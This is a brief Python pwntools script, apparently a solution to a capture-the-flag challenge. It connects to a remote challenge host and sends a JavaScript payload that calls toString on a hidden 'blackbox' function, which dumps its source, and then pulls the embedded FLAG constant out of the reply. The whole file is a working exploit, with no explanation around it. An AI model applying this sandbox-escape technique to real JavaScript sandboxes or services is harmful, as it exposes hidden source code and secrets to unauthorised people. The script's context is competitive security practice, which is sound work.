#!/usr/bin/env python3

from pwn import *

r = remote(
    "841028ec-cbe3-45ae-a1fc-56ef0a1f979c.play-dev.gaslightctf.cooking", 31337, ssl=True
)

r.recvuntil(b"> ")
r.sendline(b"(()=>{}).toString.apply(blackbox)")

r.recvuntil(b"const FLAG = ")
flag = r.recvuntil(b";", drop=True).decode()

log.success(f"{flag = }")
